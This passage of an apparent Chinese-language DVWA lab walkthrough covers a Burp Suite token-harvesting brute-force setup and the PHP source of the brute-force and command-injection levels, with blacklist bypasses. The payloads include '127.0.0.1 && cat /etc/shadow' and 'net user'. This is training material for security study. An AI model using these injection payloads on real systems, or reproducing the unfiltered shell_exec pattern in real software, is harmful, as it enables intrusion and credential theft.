<li><code>Payloads</code> &gt;&gt; <code>Attack type</code>使用 <code>Pitchfork</code></li>
<li><code>Options</code> &gt;&gt; <code>Request Engine</code> &gt;&gt; <code>Number of threads</code> 为 <code>1</code> &gt;&gt; <code>Grep-Extract</code> &gt;&gt; <code>Add</code> &gt;&gt; <code>Refetch response</code> &gt;&gt; 在下方找到 <code>user_token</code> 的值,选中并<strong>复制</strong>，选中后上方会自动填写相应的值 &gt;&gt; <code>OK</code></li>
<li><code>Payloads</code> <ul>
<li><code>Payload Sets</code> &gt;&gt; <code>Payload set</code> 为 <code>2</code> &gt;&gt; <code>Payload type</code> 为 <code>Recursive grep</code> &gt;&gt; <code>Payload Options [Recursive grep]</code> &gt;&gt; <code>Initial payload for first request</code> 为 <strong><code>刚才复制的token值</code></strong></li>
<li><code>Payload Sets</code> &gt;&gt; <code>Payload set</code> 为 <code>1</code> &gt;&gt; <code>Payload type</code> 为 <code>Simple list</code> &gt;&gt; <code>Payload Options [Simple list]</code> 加载字典 &gt;&gt; <code>Start attack</code> &gt;&gt; <code>Length</code> 与众不同</li>
</ul>
</li>
</ul>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="variable">$timenow</span>    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>加入了可靠的防爆破机制，监测到频繁的错误登录后，系统将锁定帐号，同时采用更为安全的PDO(PHP Data Object，不能PDO扩展本身执行任何数据库操作，而SQL注入的关键是通过破坏SQL语句结构执行恶意SQL命令) 机制防御SQL注入。</p>
<p><a href="https://www.runoob.com/php/php-pdo.html">PDO</a></p>
<h1 id="Command-Injection-命令注入"><a href="#Command-Injection-命令注入" class="headerlink" title="Command Injection (命令注入)"></a>Command Injection (命令注入)</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stristr(string,search,before_search)</code> 函数搜索字符串在另一字符串中第一次出现，返回字符串的剩余部分，未找到返回<code>false</code> ；<code>string</code> 参数为被搜索字符串，<code>search</code> 参数为要搜索的字符串(若该参数为数字，用对应的ASCII值的字符)，<code>before_search</code> 参数为布尔型，默认为 <code>false</code> ,设置为 <code>true</code> 函数将返回 <code>search</code> 参数第一次出现之前的字符串部分。</p>
<p><code>php_uname(mode)</code> 函数返回运行php的操作系统的相关描述，<code>mode</code> 参数可取值： <code>a</code>(默认，包含所有模式)，<code>s</code>(返回操作系统名称)，<code>n</code>(返回主机名)，<code>r</code>(返回版本名称)，<code>v</code>(返回版本信息)，<code>m</code>(返回机器类型)。</p>
<p>服务器通过判断操作系统执行不同的ping命令，但对IP参数并未做任何过滤，导致严重命令注入漏洞。</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Windows 和 Linux 系统都可用 <code>&amp;&amp;</code> 执行多条命令</p>
<p><code>127.0.0.1 &amp;&amp; net user</code><br><code>127.0.0.1 &amp;&amp; cat /etc/shadow</code></p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>服务端对IP参数做了一定过滤，把 <code>&amp;&amp;</code> 、 <code>;</code> 过滤了，本质上采用的是黑名单机制，因此依旧存在安全问题。</strong></p>
<h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
<li>只过滤了 <code>&amp;&amp;</code> 与 <code>;</code> 所有 <code>&amp;</code> 不会受影响</li>
</ul>
<p><code>&amp;&amp;</code> 与 <code>&amp;</code> 的区别:</p>
<p><code>CommandA &amp;&amp; CommandB</code> 先执行 <code>CommandA</code> 成功后执行 <code>CommandB</code> 否则不执行 <code>CommandB</code></p>
<p><code>CommandA &amp; CommandB</code> 不管 <code>CommandA</code> 是否成功 <code>CommandB</code> 都执行</p>
<ul>
<li>由于使用 <code>str_replace</code> 把 <code>&amp;&amp;</code> 、<code>;</code> 替换成了空字符，因此可用 <code>&amp;;&amp;</code> 绕过</li>
</ul>
<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>进一步完善了黑名单，但黑名单有局限性，仍然可绕过</p>
<h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>过滤列表中 <code>|</code> (后有一个空格),<code>|</code> 成了漏网之鱼,在命令<code>|</code>与命令间不只用空格即可绕过。</p>
<p><code>CommandA |CommandB</code> <code>|</code> 为管道符，将 <code>CommandA</code> 输出作为 <code>CommandB</code> 的输入，且只打印 <code>CommandB</code> 的结果。</p>
<h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stripshes(string)</code> 函数会删除字符串 <code>string</code> 中的反斜杠，返回已剔除反斜杠的字符串</p>
<p><code>explode(separator,string,[limit])</code> 函数把字符串打散为数组，返回字符串的数组，<code>separator</code> 参数规定在哪分割字符串，<code>string</code> 参数是要分割的字符，可选参数 <code>limit</code> 规定返回的数组元素的数目。</p>
<p><code>is_numeric(string)</code> 函数监测 <code>string</code> 是否为数字或数字字符串，是返回 <code>true</code> ，否 返回 <code>false</code> 。</p>
<p>加入了 <code>Anti-CSRF token</code> 同时对参数 <code>ip</code> 进行了严格限制，只有 <code>数字.数字.数字.数字</code> 的输入才会被接收执行。</p>
<h1 id="CSRF-Cross-Site-Request-Forgery-跨站请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站请求伪造" class="headerlink" title="CSRF(Cross Site Request Forgery,跨站请求伪造)"></a>CSRF(Cross Site Request Forgery,跨站请求伪造)</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? 